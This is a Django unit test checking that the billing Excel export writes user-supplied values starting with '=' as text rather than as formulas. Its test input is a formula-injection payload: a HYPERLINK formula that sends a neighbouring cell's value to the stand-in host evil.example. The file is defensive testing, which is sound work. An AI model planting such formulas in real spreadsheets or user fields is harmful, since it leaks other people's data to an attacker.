from io import BytesIO
from zipfile import ZipFile

from django.test import SimpleTestCase

from juntagrico_billing.util.xls import generate_excel


class GenerateExcelTest(SimpleTestCase):
    def test_strings_are_not_written_as_formulas(self):
        """
        values starting with '=' (e.g. a member name chosen at signup)
        must end up as text in the sheet, not as formula.
        """
        data = [{'last_name': '=HYPERLINK("https://evil.example/?d="&C2,"Saldo")', 'first_name': 'Eve'}]
        response = generate_excel([('last_name', 'Nachname'), ('first_name', 'Vorname')], data, 'test')

        with ZipFile(BytesIO(response.content)) as xlsx:
            sheet = xlsx.read('xl/worksheets/sheet1.xml').decode()
            shared_strings = xlsx.read('xl/sharedStrings.xml').decode()

        self.assertNotIn('<f>', sheet)
        self.assertIn('=HYPERLINK(', shared_strings)
